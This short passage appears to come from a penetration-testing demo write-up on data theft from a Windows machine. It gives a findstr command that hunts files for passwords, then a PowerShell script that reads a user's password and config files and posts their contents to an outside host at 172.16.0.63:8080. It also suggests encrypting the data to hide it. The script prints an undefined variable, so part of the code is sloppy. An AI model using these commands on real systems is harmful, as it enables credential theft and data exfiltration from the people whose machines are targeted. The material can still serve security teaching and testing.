## Finding information

In this demo, we looked for sensitive information using the findstr command:

``` findstr /si password *.txt *.xslx *.csv *.conf *.config ```

There are many other tools which can accomplish this. 

As for getting it out, if you have a shell you can copy+paste, but for
larger volumes of data, Invoke-WebRequest works fine:

```
$file1 = Get-Content -Path C:\Users\Shane\Documents\pass.txt -Raw
$file2 = Get-Content -Path C:\Users\Shane\Downloads\config.ini -Raw

$content = $file1 + "`n=====`n" + "$file2"

Write-Host $encrypted_string

Invoke-WebRequest -Uri http://172.16.0.63:8080 -Method Post -Body $content 
```

Bonus points for encryption. This can be accomplished with ConvertTo-SecureString, but Microsoft makes it as painful as possible.
